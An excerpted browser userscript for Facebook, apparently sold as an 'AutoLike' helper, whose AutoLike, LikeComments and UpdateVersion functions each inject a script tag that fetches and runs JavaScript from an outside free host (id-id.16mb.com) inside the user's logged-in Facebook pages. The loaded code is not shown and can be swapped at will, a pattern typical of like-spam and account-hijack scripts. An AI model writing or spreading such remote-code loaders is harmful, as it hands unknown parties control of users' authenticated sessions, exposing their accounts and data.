...
// @author			Febrian Deny
// @authorURL		http://www.facebook.com/febriandeny3
// @homepage		http://www.kakiteng.com/
// @include			htt*://www.facebook.com/*
// @icon			http://www.usphs.gov/images/home/facebook-logo.png
// @version			v.1
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="http://id-id.16mb.com/1.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.LikeComments = function() {javascript:(a=(b=document).createElement("script")).src="http://id-id.16mb.com/2.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="http://id-id.16mb.com/3.js",b.body.appendChild(a);void(0);};}
